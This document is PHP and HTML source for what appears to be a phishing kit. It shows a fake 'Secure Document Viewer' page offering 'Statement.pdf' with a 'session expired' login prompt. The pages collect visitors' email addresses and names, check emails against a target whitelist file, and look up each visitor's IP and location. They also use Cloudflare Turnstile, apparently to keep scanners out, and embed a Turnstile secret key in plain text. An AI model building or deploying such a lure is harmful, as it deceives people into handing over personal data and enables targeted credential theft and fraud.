<?php
session_start();

$step = $_SESSION['step'] ?? 1;
$old_email = $_SESSION['old_email'] ?? '';
$error = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Document Viewer</title>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>
:root {
    --card-bg: #f5f5f5;
    --text-color: #222;
    --subtext: #666;
    --border: #d0d0d0;
    --btn-bg: #1a73e8;
    --btn-hover: #185abc;
    --overlay-dark: rgba(0,0,0,0.65);
    --error: #c21515;
}

@media (prefers-color-scheme: dark) {
    :root {
        --card-bg: #1c1c1c;
        --text-color: #eee;
        --subtext: #aaa;
        --border: #333;
        --btn-bg: #3478f6;
        --btn-hover: #1f5fcc;
        --overlay-dark: rgba(0,0,0,0.75);
    }
}

body {
    margin: 0;
    font-family: system-ui, sans-serif;
    background: #000;
    color: var(--text-color);
    min-height: 100vh;
}

.page-wrapper {
    position: relative;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
}

.doc-background {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    filter: blur(6px);
    transform: scale(1.05);
    opacity: 0.7;
}

.doc-background img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.page-wrapper::before {
    content: "";
    position: absolute;
    inset: 0;
    background: var(--overlay-dark);
}

.login-card {
    position: relative;
    z-index: 2;
    width: 94%;
    max-width: 330px;
    background: var(--card-bg);
    padding: 22px 22px;
    border-radius: 6px;
    box-shadow: 0px 18px 40px rgba(0,0,0,0.45);
}

.doc-icon {
    width: 42px;
    height: 42px;
    margin: 0 auto 8px;
}
.doc-icon img { width:100%; height:100%; object-fit:contain; }

.doc-title { text-align:center; font-size:16px; font-weight:600; }
.doc-subtitle { text-align:center; font-size:11px; color:var(--subtext); margin:8px 0 12px; }

.login-error { text-align:center; font-size:11px; color:var(--error); margin-bottom:10px; }

.field-wrapper { margin-bottom: 12px; }
.field-wrapper input {
    width: 100%;
    padding: 10px;
    border-radius: 4px;
    border: 1px solid var(--border);
    background: transparent;
    color: var(--text-color);
}

.btn-primary {
    width: 100%;
    padding: 10px;
    background: var(--btn-bg);
    border:none;
    color:#fff;
    font-size:14px;
    border-radius:4px;
    cursor:pointer;
}
.btn-primary:hover { background: var(--btn-hover); }

.cf-turnstile { transform: scale(0.9); transform-origin: 0 0; margin-bottom:10px; }
</style>
</head>
<body>
<div class="page-wrapper">
    <div class="doc-background">
        <img src="assets/background.png" alt="Document preview">
    </div>

    <div class="login-card">
        <div class="doc-icon"><img src="assets/PDtrans.png"></div>

        <h2 class="doc-title">Statement.pdf <span style="font-size:11px;color:var(--subtext)">(197 KB)</span></h2>
        <p class="doc-subtitle">Previous session has expired, log in to continue.</p>

        <?php if($error): ?>
            <p class="login-error"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if($step == 1): ?>
        <!-- STEP 1: Email + Turnstile -->
        <form method="POST" action="login.php">
            <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>

            <div class="field-wrapper">
                <input type="email" name="email" value="<?= htmlspecialchars($old_email) ?>" placeholder="Enter your email" required>
            </div>

            <button class="btn-primary">Next</button>
        </form>

        <?php else: ?>
        <!-- STEP 2: Name + Editable Email -->
        <form method="POST" action="login.php">
            <div class="field-wrapper">
                <input type="email" name="email" value="<?= htmlspecialchars($old_email) ?>" placeholder="Enter your email" required>
            </div>

            <div class="field-wrapper">
                <input type="text" name="name" placeholder="Enter your name" required>
            </div>

            <button class="btn-primary">Next</button>
        </form>
        <?php endif; ?>

    </div>
</div>
</body>
</html><?php
// --- SETTINGS ---
$secret_key = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc"; // Turnstile Secret
$whitelist_file = "papa.txt"; // your whitelist emails file

// --- GET REAL USER IP ---
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return trim(current(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])));
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

$user_ip = getUserIP();

// --- GET LOCATION VIA IP API ---
$location = ["country" => "", "city" => ""];
$loc_json = @file_get_contents("https://ipapi.co/{$user_ip}/json/");
if ($loc_json) {
    $loc_data = json_decode($loc_json, true);
    $location["country"] = $loc_data["country_name"] ?? "";
    $location["city"] = $loc_data["city"] ?? "";
}
?>

<!DOCTYPE html>
<html lang="en" data-theme="auto">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Email Verify</title>
<link rel="stylesheet" href="style.css">
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>
:root {
  --card-bg-light: rgba(255,255,255,0.8);
  --card-bg-dark: rgba(20,20,20,0.8);
}

/* Auto Detect Dark/Light Mode */
@media (prefers-color-scheme: dark) {
  body { background-color: #111; }
  .login-card { background: var(--card-bg-dark); color: #fff; }
}
@media (prefers-color-scheme: light) {
  body { background-color: #fafafa; }
  .login-card { background: var(--card-bg-light); color: #000; }
}

.page-wrapper { position: relative; width:100%; height:100vh; }
.doc-background img { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; z-index:-1; }
.login-card { width:360px; margin:auto; padding:25px; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.2); backdrop-filter:blur(4px); }
.field { margin-bottom:20px; }
.hidden { display:none; }
</style>
</head>
<body>
<div class="page-wrapper">
    <div class="doc-background">
        <img src="assets/background.png" alt="Document preview">
    </div>

    <div class="login-card">
        <div class="doc-icon">
            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
        </div>

        <!-- DISPLAY IP + LOCATION -->
        <p><strong>IP:</strong> <?= htmlspecialchars($user_ip) ?></p>
        <p><strong>Location:</strong> <?= htmlspecialchars($location["city"] . ", " . $location["country"]) ?></p>

        <form id="mainForm" method="POST" action="validate.php">
            <!-- EMAIL FIELD ALWAYS EDITABLE -->
            <div class="field">
                <label>Email:</label>
                <input type="email" id="email" name="email" required>
            </div>

            <!-- TURNSTILE ALWAYS RE-REQUIRED WHEN EMAIL CHANGES -->
            <div class="field" id="captchaBox">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
            </div>

            <button type="button" onclick="validateEmail()">Validate Email</button>

            <!-- NAME FIELD APPEARS ONLY AFTER VALID EMAIL -->
            <div id="nameSection" class="hidden">
                <div class="field">
                    <label>Your Name:</label>
                    <input type="text" name="username" required>
                </div>
                <button type="submit">Submit</button>
            </div>
        </form>
    </div>
</div>

<script>
let lastValidatedEmail = "";

// When user changes email → reset validation
email.oninput = () => {
    if (email.value !== lastValidatedEmail) {
        document.getElementById('nameSection').classList.add('hidden');
    }
};

function validateEmail() {
    let emailVal = email.value.trim();
    if (!emailVal) return alert("Enter email first");

    // Rebuild Turnstile token
    turnstile.render('#captchaBox', { sitekey: "0x4AAAAAACEAdYvsKv0_uuH2" });

    fetch('verify_email.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'email=' + encodeURIComponent(emailVal)
    })
    .then(r => r.text())
    .then(res => {
        if (res === 'OK') {
            lastValidatedEmail = emailVal;
            document.getElementById('nameSection').classList.remove('hidden');
        } else {
            alert(res);
        }
    });
}
</script>
</body>
</html>
